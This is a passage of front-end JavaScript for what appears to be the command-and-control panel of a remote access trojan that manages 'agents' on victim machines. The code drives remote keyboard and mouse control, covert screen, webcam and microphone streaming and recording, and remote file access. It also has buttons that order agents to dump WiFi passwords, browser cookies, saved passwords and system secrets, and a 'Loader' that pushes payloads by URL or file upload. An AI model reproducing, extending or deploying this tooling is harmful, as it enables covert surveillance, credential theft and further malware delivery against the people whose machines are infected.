            e.preventDefault();
            screenVideoEl.focus();
            const coords = getNormalizedVideoCoordinates(e, screenVideoEl);
            if (coords) {
                let btn = 'left';
                if (e.button === 2) btn = 'right';
                else if (e.button === 1) btn = 'middle';
                sendRemoteInput({
                    type: 'mouse_down',
                    button: btn,
                    x: coords.x,
                    y: coords.y
                });
            }
        });

        screenVideoEl.addEventListener('mouseup', (e) => {
            if (!state.remoteControlActive) return;
            e.preventDefault();
            const coords = getNormalizedVideoCoordinates(e, screenVideoEl);
            if (coords) {
                let btn = 'left';
                if (e.button === 2) btn = 'right';
                else if (e.button === 1) btn = 'middle';
                sendRemoteInput({
                    type: 'mouse_up',
                    button: btn,
                    x: coords.x,
                    y: coords.y
                });
            }
        });

        screenVideoEl.addEventListener('contextmenu', (e) => {
            if (state.remoteControlActive) {
                e.preventDefault(); // Prevent browser context menu so right-click is sent to target desktop
            }
        });

        screenVideoEl.addEventListener('dblclick', (e) => {
            if (!state.remoteControlActive) return;
            e.preventDefault();
            const coords = getNormalizedVideoCoordinates(e, screenVideoEl);
            if (coords) {
                sendRemoteInput({
                    type: 'dblclick',
                    button: 'left',
                    x: coords.x,
                    y: coords.y
                });
            }
        });

        screenVideoEl.addEventListener('wheel', (e) => {
            if (!state.remoteControlActive) return;
            e.preventDefault();
            const coords = getNormalizedVideoCoordinates(e, screenVideoEl);
            sendRemoteInput({
                type: 'wheel',
                delta_y: e.deltaY,
                x: coords ? coords.x : 0.5,
                y: coords ? coords.y : 0.5
            });
        }, { passive: false });
    }

    // Keyboard Input Capture when Remote Control is Active
    window.addEventListener('keydown', (e) => {
        if (!state.remoteControlActive) return;
        const activeTag = document.activeElement ? document.activeElement.tagName.toLowerCase() : '';
        if (activeTag === 'input' || activeTag === 'textarea' || activeTag === 'select') return;

        if (['Tab', 'Backspace', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Space', 'F5', 'F11', 'F12'].includes(e.key) || e.key.startsWith('F')) {
            e.preventDefault();
        }

        sendRemoteInput({
            type: 'key_down',
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey
        });
    });

    window.addEventListener('keyup', (e) => {
        if (!state.remoteControlActive) return;
        const activeTag = document.activeElement ? document.activeElement.tagName.toLowerCase() : '';
        if (activeTag === 'input' || activeTag === 'textarea' || activeTag === 'select') return;

        sendRemoteInput({
            type: 'key_up',
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey
        });
    });

    // Live stream parameter change listeners
    const screenResSelect = document.getElementById('screen-res');
    const screenFpsSelect = document.getElementById('screen-fps');
    const screenQualitySelect = document.getElementById('screen-quality');
    if (screenResSelect && screenFpsSelect) {
        const handleScreenChange = () => {
            if (state.selectedAgentId) {
                const fps = parseInt(screenFpsSelect.value || 30);
                const resVal = parseInt(screenResSelect.value || 1920);
                const quality = parseInt(screenQualitySelect?.value || 75);
                const width = resVal === 0 ? 0 : resVal;
                socket.emit('update_stream_params', {
                    agent_id: state.selectedAgentId,
                    stream_type: 'screen',
                    target_width: width,
                    quality: quality,
                    fps: fps
                });
                const qualityBadge = document.getElementById('screen-quality-badge');
                if (qualityBadge) {
                    let resLabel = resVal === 0 ? 'Native' : (resVal === 1920 ? '1080p' : (resVal === 2560 ? '2K' : (resVal === 1280 ? '720p' : '480p')));
                    qualityBadge.textContent = `${resLabel} ${fps}FPS (${quality}%)`;
                }
                showToast('info', `Screen quality updated: ${resVal === 0 ? 'Native' : resVal + 'px'} @ ${fps}FPS`);
            }
        };
        screenResSelect.addEventListener('change', handleScreenChange);
        screenFpsSelect.addEventListener('change', handleScreenChange);
        if (screenQualitySelect) screenQualitySelect.addEventListener('change', handleScreenChange);
    }

    const cameraResSelect = document.getElementById('camera-res');
    const cameraFpsSelect = document.getElementById('camera-fps');
    const cameraQualitySelect = document.getElementById('camera-quality');
    const cameraDevSelect = document.getElementById('camera-device-select');
    if (cameraResSelect && cameraFpsSelect) {
        const handleCameraChange = () => {
            if (state.selectedAgentId) {
                const fps = parseInt(cameraFpsSelect.value || 30);
                const resVal = parseInt(cameraResSelect.value || 1920);
                const quality = parseInt(cameraQualitySelect?.value || 70);
                const width = resVal === 0 ? 0 : resVal;
                socket.emit('update_stream_params', {
                    agent_id: state.selectedAgentId,
                    stream_type: 'camera',
                    target_width: width,
                    quality: quality,
                    fps: fps
                });
                const qualityBadge = document.getElementById('camera-quality-badge');
                if (qualityBadge) {
                    let resLabel = resVal === 0 ? 'Native' : (resVal === 1920 ? '1080p' : (resVal === 2560 ? '2K' : (resVal === 1280 ? '720p' : '480p')));
                    qualityBadge.textContent = `${resLabel} ${fps}FPS (${quality}%)`;
                }
                showToast('info', `Camera quality updated: ${resVal === 0 ? 'Native' : resVal + 'px'} @ ${fps}FPS`);
            }
        };
        cameraResSelect.addEventListener('change', handleCameraChange);
        cameraFpsSelect.addEventListener('change', handleCameraChange);
        if (cameraQualitySelect) cameraQualitySelect.addEventListener('change', handleCameraChange);
        if (cameraDevSelect) {
            cameraDevSelect.addEventListener('change', () => {
                if (activeWebRTC.camera.pc || document.getElementById('camera-video')?.style.display !== 'none' || document.getElementById('camera-img')?.style.display !== 'none') {
                    showToast('info', 'Webcam device changed. Restarting camera stream...');
                    btnCameraStart?.click();
                }
            });
        }
    }

    // Audio Controls
    const btnAudioStart = document.getElementById('start-audio-btn');
    const btnAudioStop = document.getElementById('stop-audio-btn');
    const btnRecordAudio = document.getElementById('record-audio-btn');
    const btnRefreshAudio = document.getElementById('refresh-audio-devices-btn');
    const dspModeSelect = document.getElementById('audio-dsp-mode');
    const audioDevSelect = document.getElementById('audio-device-select');
    const boostSelect = document.getElementById('audio-volume-boost');

    if (btnRefreshAudio) {
        btnRefreshAudio.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('error', 'Select a target agent first');
                return;
            }
            const icon = document.getElementById('refresh-audio-icon');
            if (icon) icon.classList.add('ph-spin');
            sendCommand(state.selectedAgentId, 'get_audio_devices');
            showToast('info', 'Scanning audio devices on target agent...');
        });
    }

    if (dspModeSelect) {
        dspModeSelect.addEventListener('change', () => {
            applyAudioDspMode(dspModeSelect.value);
            showToast('info', `Audio DSP set to: ${dspModeSelect.options[dspModeSelect.selectedIndex].text}`);
        });
    }

    if (boostSelect) {
        boostSelect.addEventListener('change', () => {
            const val = parseFloat(boostSelect.value);
            studioAudio.setVolumeBoost(val);
            showToast('info', `Audio Gain Boost set to ${Math.round(val * 100)}%`);
        });
    }

    if (audioDevSelect) {
        audioDevSelect.addEventListener('change', () => {
            if (activeWebRTC.audio.pc) {
                showToast('info', 'Microphone device changed. Restarting audio stream...');
                btnAudioStart?.click();
            }
        });
    }

    if (btnRecordAudio) {
        btnRecordAudio.addEventListener('click', () => {
            if (!studioAudio.isRecording) {
                const started = studioAudio.startRecording();
                if (started) {
                    btnRecordAudio.classList.add('recording');
                    const txt = document.getElementById('record-audio-text');
                    if (txt) txt.textContent = 'Stop Rec';
                    showToast('info', 'Audio recording started (.webm capture)');
                }
            } else {
                studioAudio.stopRecording();
                btnRecordAudio.classList.remove('recording');
                const txt = document.getElementById('record-audio-text');
                if (txt) txt.textContent = 'Record';
                showToast('success', 'Audio recording saved & downloaded');
            }
        });
    }

    if (btnAudioStart && btnAudioStop) {
        btnAudioStart.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }

            const selectedDevice = audioDevSelect ? audioDevSelect.value : 'default';

            btnAudioStart.disabled = true;
            const dspVal = document.getElementById('audio-dsp-mode')?.value || 'studio';
            startWebRTCStream('audio', { device: selectedDevice, dsp_mode: dspVal });
            socket.emit('start_audio', { agent_id: state.selectedAgentId, device: selectedDevice, dsp_mode: dspVal });

            const placeholder = document.getElementById('audio-visualizer-placeholder');
            const activeContainer = document.getElementById('audio-active-container');
            if (placeholder) placeholder.style.display = 'none';
            if (activeContainer) activeContainer.style.display = 'flex';
            const audioBadge = document.getElementById('audio-stream-badge');
            if (audioBadge) audioBadge.style.display = 'inline-block';

            if (btnRecordAudio) btnRecordAudio.style.display = 'inline-flex';

            setTimeout(() => {
                btnAudioStart.style.display = 'none';
                btnAudioStop.style.display = 'inline-flex';
                btnAudioStart.disabled = false;
            }, 500);
        });

        btnAudioStop.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            btnAudioStop.disabled = true;
            btnAudioStop.style.display = 'none';
            btnAudioStart.style.display = 'inline-flex';
            stopWebRTCStream('audio');

            setTimeout(() => {
                btnAudioStop.disabled = false;
            }, 300);
        });
    }

    const navUpBtn = document.getElementById('f-nav-up');
    if (navUpBtn) {
        navUpBtn.addEventListener('click', () => {
            let currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
            if (currentPath === 'Drives' || currentPath === 'Drives\\') return;
            if (currentPath.endsWith('\\') && currentPath.length > 3) {
                currentPath = currentPath.slice(0, -1);
            }
            const parts = currentPath.split('\\');
            if (parts.length > 1) {
                parts.pop();
                let parent = parts.join('\\');
                if (!parent.includes('\\')) parent += '\\';
                requestFileList(parent);
            } else {
                requestFileList('Drives');
            }
        });
    }

    const navBackBtn = document.getElementById('f-nav-back');
    if (navBackBtn) {
        navBackBtn.addEventListener('click', () => {
            if (state.fileHistoryIdx > 0) {
                state.fileHistoryIdx--;
                const prevPath = state.fileHistory[state.fileHistoryIdx];
                requestFileList(prevPath, false);
            }
        });
    }

    const navFwdBtn = document.getElementById('f-nav-fwd');
    if (navFwdBtn) {
        navFwdBtn.addEventListener('click', () => {
            if (state.fileHistory && state.fileHistoryIdx < state.fileHistory.length - 1) {
                state.fileHistoryIdx++;
                const nextPath = state.fileHistory[state.fileHistoryIdx];
                requestFileList(nextPath, false);
            }
        });
    }

    const newFolderBtn = document.getElementById('new-folder-btn');
    if (newFolderBtn) {
        newFolderBtn.addEventListener('click', async () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            const folderName = await showCustomPrompt({
                title: 'Create New Folder',
                subtitle: 'Files & Actions',
                message: 'Enter new folder name:',
                defaultValue: 'New Folder',
                icon: 'ph-folder-plus',
                confirmText: 'Create Folder'
            });
            if (!folderName || !folderName.trim()) return;
            const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
            const baseDir = (currentPath === 'Drives' || currentPath === 'Drives\\') ? 'C:\\' : currentPath;
            const sep = baseDir.endsWith('\\') || baseDir.endsWith('/') ? '' : '\\';
            const fullPath = baseDir + sep + folderName.trim();
            sendCommand(state.selectedAgentId, 'file_mkdir', { path: fullPath });
            showToast('info', `Creating folder "${folderName.trim()}"...`);
        });
    }

    const uploadBtn = document.getElementById('upload-btn');
    if (uploadBtn) {
        uploadBtn.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = (e) => {
                const file = e.target.files[0];
                if (!file) return;
                const reader = new FileReader();
                reader.onload = () => {
                    const base64 = reader.result.split(',')[1];
                    const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                    const baseDir = (currentPath === 'Drives' || currentPath === 'Drives\\') ? 'C:\\' : currentPath;
                    const sep = baseDir.endsWith('\\') || baseDir.endsWith('/') ? '' : '\\';
                    const targetPath = baseDir + sep + file.name;
                    showToast('info', `Uploading ${file.name}...`);
                    sendCommand(state.selectedAgentId, 'file_upload', { data: base64, path: targetPath });
                };
                reader.readAsDataURL(file);
            };
            input.click();
        });
    }

    const toolbarDownloadBtn = document.getElementById('download-btn');
    if (toolbarDownloadBtn) {
        toolbarDownloadBtn.addEventListener('click', async () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
            const pathValue = await showCustomPrompt({
                title: 'Download File by Path',
                subtitle: 'Files & Actions',
                message: 'Enter full remote file path to download:',
                defaultValue: (currentPath !== 'Drives' && currentPath !== 'Drives\\') ? currentPath : 'C:\\',
                icon: 'ph-download-simple',
                confirmText: 'Download'
            });
            if (pathValue && pathValue.trim()) {
                sendCommand(state.selectedAgentId, 'file_download', { path: pathValue.trim() });
                showToast('info', `Requesting download for: ${pathValue.trim()}`);
            }
        });
    }

    const drivesBtn = document.getElementById('drives-btn');
    if (drivesBtn) {
        drivesBtn.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            requestFileList('Drives');
        });
    }

    // Bind Credential Dump triggers
    const dumpButtons = [
        { id: 'btn-dump-wifi', cmd: 'dump_wifi', label: 'Extracting WiFi Passwords...' },
        { id: 'btn-dump-cookies', cmd: 'dump_cookies', label: 'Extracting Browser Cookies...' },
        { id: 'btn-dump-passwords', cmd: 'dump_passwords', label: 'Extracting Saved Passwords...' },
        { id: 'btn-dump-system', cmd: 'dump_system_secrets', label: 'Extracting System Secrets...' }
    ];
    dumpButtons.forEach(b => {
        const btn = document.getElementById(b.id);
        if (btn) {
            btn.addEventListener('click', () => {
                if (!state.selectedAgentId) { showToast('warning', 'Select an online agent first'); return; }
                const agent = state.agents[state.selectedAgentId];
                if (agent && !agent.online) { showToast('error', 'Cannot dump credentials from an offline device'); return; }
                showToast('info', b.label);
                sendCommand(state.selectedAgentId, b.cmd);
            });
        }
    });


    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Ctrl+L to lock
        if (e.ctrlKey && e.key === 'l') {
            e.preventDefault();
            const lockScreen = document.getElementById('lock-screen');
            if (lockScreen) lockScreen.style.display = 'flex';
        }
        // Escape to close panels
        if (e.key === 'Escape') {
            const notifPanel = document.getElementById('notification-panel');
            const ctxMenu = document.getElementById('context-menu');
            if (notifPanel) notifPanel.style.display = 'none';
            if (ctxMenu) ctxMenu.style.display = 'none';
        }
        // Ctrl+1/2/3 for workspace tabs
        if (e.ctrlKey && e.key === '1') { e.preventDefault(); switchView('stream'); }
        if (e.ctrlKey && e.key === '2') { e.preventDefault(); switchPane('processes'); }
        if (e.ctrlKey && e.key === '3') { e.preventDefault(); switchView('terminal'); }
    });

    // ──────── UTILITIES ────────
    function escapeHtml(str) {
        if (typeof str !== 'string') str = String(str || '');
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function formatDate(isoStr) {
        if (!isoStr) return '—';
        try {
            const d = new Date(isoStr);
            return d.toLocaleString('en-US', {
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false,
            });
        } catch {
            return isoStr;
        }
    }

    // ──────── GOOGLE AUTHENTICATOR 2FA MANAGEMENT ────────
    function initTotpSecurity() {
        const badge = document.getElementById('totp-status-badge');
        const setupBox = document.getElementById('totp-setup-box');
        const pairedBox = document.getElementById('totp-paired-box');
        const qrImg = document.getElementById('totp-qr-img');
        const secretKeyEl = document.getElementById('totp-secret-key');
        const bindCodeInput = document.getElementById('totp-bind-code');
        const bindBtn = document.getElementById('totp-bind-btn');
        const bindError = document.getElementById('totp-bind-error');
        const resetBtn = document.getElementById('totp-reset-btn');

        if (!badge) return;

        fetch('/api/totp/status')
            .then(r => r.json())
            .then(data => {
                if (data.setup_complete) {
                    badge.textContent = 'Single Device Paired';
                    badge.style.background = 'rgba(74, 222, 128, 0.15)';
                    badge.style.color = '#4ade80';
                    badge.style.borderColor = 'rgba(74, 222, 128, 0.3)';

                    if (setupBox) setupBox.style.display = 'none';
                    if (pairedBox) pairedBox.style.display = 'block';
                } else {
                    badge.textContent = 'Unpaired — Setup Required';
                    badge.style.background = 'rgba(251, 191, 36, 0.15)';
                    badge.style.color = '#fbbf24';
                    badge.style.borderColor = 'rgba(251, 191, 36, 0.3)';

                    if (setupBox) setupBox.style.display = 'block';
                    if (pairedBox) pairedBox.style.display = 'none';

                    if (data.secret && secretKeyEl) secretKeyEl.textContent = data.secret;
                    if (data.qr_uri && qrImg) {
                        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.qr_uri)}`;
                    }
                }
            })
            .catch(() => {
                badge.textContent = '2FA Error';
            });

        if (bindBtn) {
            bindBtn.onclick = async () => {
                const code = bindCodeInput?.value.trim();
                if (!code || code.length !== 6) {
                    if (bindError) {
                        bindError.textContent = 'Please enter a valid 6-digit Authenticator code';
                        bindError.style.display = 'block';
                    }
                    return;
                }
                bindBtn.disabled = true;
                bindBtn.textContent = 'Verifying...';

                try {
                    const res = await fetch('/api/totp/verify-setup', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRFToken': getCsrfToken()
                        },
                        body: JSON.stringify({ code })
                    });
                    const resData = await res.json();
                    bindBtn.disabled = false;
                    bindBtn.innerHTML = '<i class="ph ph-lock-key"></i> Pair & Lock Device';

                    if (res.ok && resData.success) {
                        showToast('success', resData.message || 'Google Authenticator paired to single device!');
                        if (bindError) bindError.style.display = 'none';
                        if (bindCodeInput) bindCodeInput.value = '';
                        initTotpSecurity();
                    } else {
                        if (bindError) {
                            bindError.textContent = resData.error || 'Invalid 2FA Code';
                            bindError.style.display = 'block';
                        }
                        showToast('error', resData.error || 'Invalid 2FA Code');
                    }
                } catch (e) {
                    bindBtn.disabled = false;
                    bindBtn.innerHTML = '<i class="ph ph-lock-key"></i> Pair & Lock Device';
                    showToast('error', 'Error binding 2FA device');
                }
            };
        }

        if (resetBtn) {
            resetBtn.onclick = async () => {
                const confirmOk = await showCustomConfirm({
                    title: 'Reset 2FA Pairing (2FA Required)',
                    subtitle: 'Security Settings',
                    message: 'Enter your current 6-digit Google Authenticator code to reset 2FA pairing and generate a new QR code:',
                    icon: 'ph-arrows-clockwise',
                    confirmText: 'Reset 2FA Pairing',
                    isDanger: true,
                    requireTotp: true
                });
                if (confirmOk) {
                    fetch('/api/totp/reset', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRFToken': getCsrfToken()
                        },
                        body: JSON.stringify({ code: document.getElementById('c-modal-totp-input')?.value.trim() })
                    })
                        .then(r => r.json())
                        .then(data => {
                            if (data.success) {
                                showToast('success', '2FA reset successfully. You can now pair a new device.');
                                initTotpSecurity();
                            } else {
                                showToast('error', data.error || 'Failed to reset 2FA');
                            }
                        })
                        .catch(() => showToast('error', 'Network error resetting 2FA'));
                }
            };
        }
    }

    // ──────── INITIAL LOAD ────────
    fetch('/api/agents')
        .then(r => r.json())
        .then(data => {
            data.forEach(a => state.agents[a.agent_id] = a);
            renderAgentList();
            updateCounters();
            addLog('system', `Loaded ${data.length} agent(s)`);
            initTotpSecurity();
        })
        .catch(() => {
            addLog('system', 'Failed to load agents');
            initTotpSecurity();
        });



    // ──────── OTHER FEATURES BUTTONS ────────

    const btnMsg = document.getElementById('btn-feature-msg');
    const btnUrl = document.getElementById('btn-feature-url');
    const btnLoader = document.getElementById('btn-feature-loader');
    const resultContainer = document.getElementById('other-features-result');
    const resultContent = document.getElementById('other-features-result-content');
    const resultTitle = document.getElementById('other-features-result-title');

    const msgScreen = document.getElementById('msg-screen');
    const msgInput = document.getElementById('msg-input');
    const msgSubmitBtn = document.getElementById('msg-submit-btn');
    const msgCancelBtn = document.getElementById('msg-cancel-btn');

    if (btnMsg && msgScreen) {
        btnMsg.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an online agent first'); return; }
            const agent = state.agents[state.selectedAgentId];
            if (agent && !agent.online) { showToast('error', 'Cannot send commands to an offline device'); return; }

            msgInput.value = '';
            msgScreen.style.display = 'flex';
            msgInput.focus();
        });

        msgCancelBtn.addEventListener('click', () => {
            msgScreen.style.display = 'none';
        });

        msgSubmitBtn.addEventListener('click', () => {
            const message = msgInput.value;
            if (message === null || message.trim() === '') {
                showToast('error', 'Message cannot be empty');
                return;
            }

            showToast('info', 'Sending message box to target...');
            sendCommand(state.selectedAgentId, 'msg', { value: message });

            resultTitle.innerText = 'Message Box Sent';
            resultContent.innerHTML = `<div style="padding: 10px;">Message payload: <br><pre style="background: rgba(0,0,0,0.2); padding: 8px; margin-top: 5px;">${escapeHtml(message)}</pre></div>`;
            resultContainer.style.display = 'block';

            msgScreen.style.display = 'none';
        });
    }

    const urlScreen = document.getElementById('url-screen');
    const urlInput = document.getElementById('url-input');
    const urlSubmitBtn = document.getElementById('url-submit-btn');
    const urlCancelBtn = document.getElementById('url-cancel-btn');

    if (btnUrl && urlScreen) {
        btnUrl.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an online agent first'); return; }
            const agent = state.agents[state.selectedAgentId];
            if (agent && !agent.online) { showToast('error', 'Cannot send commands to an offline device'); return; }

            urlInput.value = '';
            urlScreen.style.display = 'flex';
            urlInput.focus();
        });

        urlCancelBtn.addEventListener('click', () => {
            urlScreen.style.display = 'none';
        });

        urlSubmitBtn.addEventListener('click', () => {
            const url = urlInput.value;
            if (url === null || url.trim() === '') {
                showToast('error', 'URL cannot be empty');
                return;
            }

            showToast('info', `Opening ${url} on target...`);
            sendCommand(state.selectedAgentId, 'open_url', { value: url });

            resultTitle.innerText = 'Open URL Sent';
            resultContent.innerHTML = `<div style="padding: 10px;">URL payload: <br><a href="${escapeHtml(url)}" target="_blank" style="color: var(--accent-primary);">${escapeHtml(url)}</a></div>`;
            resultContainer.style.display = 'block';

            urlScreen.style.display = 'none';
        });
    }

    const loaderScreen = document.getElementById('loader-screen');
    const loaderUrlInput = document.getElementById('loader-url');
    const loaderFileInput = document.getElementById('loader-file');
    const loaderSubmitBtn = document.getElementById('loader-submit-btn');
    const loaderCancelBtn = document.getElementById('loader-cancel-btn');

    if (btnLoader && loaderScreen) {
        btnLoader.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an online agent first'); return; }
            const agent = state.agents[state.selectedAgentId];
            if (agent && !agent.online) { showToast('error', 'Cannot send commands to an offline device'); return; }

            loaderUrlInput.value = '';
            loaderFileInput.value = '';
            loaderScreen.style.display = 'flex';
        });

        loaderCancelBtn.addEventListener('click', () => {
            loaderScreen.style.display = 'none';
        });

        loaderSubmitBtn.addEventListener('click', () => {
            const url = loaderUrlInput.value.trim();
            const file = loaderFileInput.files[0];

            if (!url && !file) {
                showToast('warning', 'Please provide a URL or select a file');
                return;
            }

            if (file) {
                const reader = new FileReader();
                reader.onload = function (e) {
                    const base64Data = e.target.result.split(',')[1];
                    showToast('info', `Sending Loader upload command to target...`);
                    sendCommand(state.selectedAgentId, 'loader_upload', { data: base64Data, filename: file.name });

                    resultTitle.innerText = 'Loader Upload Sent';
                    resultContent.innerHTML = `<div style="padding: 10px;">Loader payload file: ${escapeHtml(file.name)}</div>`;
                    resultContainer.style.display = 'block';
                    loaderScreen.style.display = 'none';
                };
                reader.onerror = function () {
                    showToast('error', 'Failed to read file');
                };
                reader.readAsDataURL(file);
            } else {
                showToast('info', `Sending Loader URL command to target...`);
                sendCommand(state.selectedAgentId, 'loader', { value: url });

                resultTitle.innerText = 'Loader URL Sent';
                resultContent.innerHTML = `<div style="padding: 10px;">Loader payload URL: <br><a href="${escapeHtml(url)}" target="_blank" style="color: var(--accent-primary);">${escapeHtml(url)}</a></div>`;
                resultContainer.style.display = 'block';
                loaderScreen.style.display = 'none';
            }
        });
    }

    const btnUpgrader = document.getElementById('btn-feature-upgrader');
    const upgraderScreen = document.getElementById('upgrader-screen');
    const upgraderUrlInput = document.getElementById('upgrader-url-input');
    const upgraderSubmitBtn = document.getElementById('upgrader-submit-btn');
    const upgraderCancelBtn = document.getElementById('upgrader-cancel-btn');

    if (btnUpgrader && upgraderScreen) {
        btnUpgrader.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an online agent first'); return; }
            const agent = state.agents[state.selectedAgentId];
            if (agent && !agent.online) { showToast('error', 'Cannot upgrade an offline device'); return; }

            upgraderUrlInput.value = '';
            upgraderScreen.style.display = 'flex';
            upgraderUrlInput.focus();
        });

        upgraderCancelBtn.addEventListener('click', () => {
            upgraderScreen.style.display = 'none';
        });

        upgraderSubmitBtn.addEventListener('click', async () => {
            const url = upgraderUrlInput.value.trim();
            if (!url) {
                showToast('warning', 'Please enter a valid binary URL');
                return;
            }

            const confirmOk = await showCustomConfirm({
                title: 'Upgrade Agent Binary',
                subtitle: 'System Maintenance',
                message: `Are you sure you want to upgrade agent executable from ${url}? The agent will download the new executable, overwrite itself, and restart.`,
                icon: 'ph-arrows-clockwise',
                confirmText: 'Upgrade & Restart Agent',
                isDanger: true
            });

            if (confirmOk) {
                showToast('info', 'Sending agent upgrade command...');
                sendCommand(state.selectedAgentId, 'upgrade', { url: url });

                resultTitle.innerText = 'Agent Upgrade Triggered';
                resultContent.innerHTML = `<div style="padding: 10px;">Upgrade payload binary URL: <br><a href="${escapeHtml(url)}" target="_blank" style="color: var(--accent-primary);">${escapeHtml(url)}</a><br><span style="color: var(--text-muted); font-size: 0.85rem; display: block; margin-top: 6px;">The agent is downloading the update, replacing the local executable, and restarting...</span></div>`;
                resultContainer.style.display = 'block';
                upgraderScreen.style.display = 'none';
            }
        });
    }

    // ──────── LOGOUT & UNLOAD CLEANUP (STOP ALL LIVE STREAMS) ────────
    function stopAllActiveStreams() {
        try {
            stopWebRTCStream('screen');
            stopWebRTCStream('camera');
            stopWebRTCStream('audio');
            if (socket && socket.connected) {
                socket.emit('stop_webrtc', { stream_type: 'all' });
            }
        } catch (e) { }
    }

    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', (e) => {
            e.preventDefault();
            stopAllActiveStreams();
            window.location.href = '/logout';
        });
    }

    window.addEventListener('beforeunload', () => {
        stopAllActiveStreams();
    });

    // Initial agent sync on DOM load
    fetchAgents(true);

})();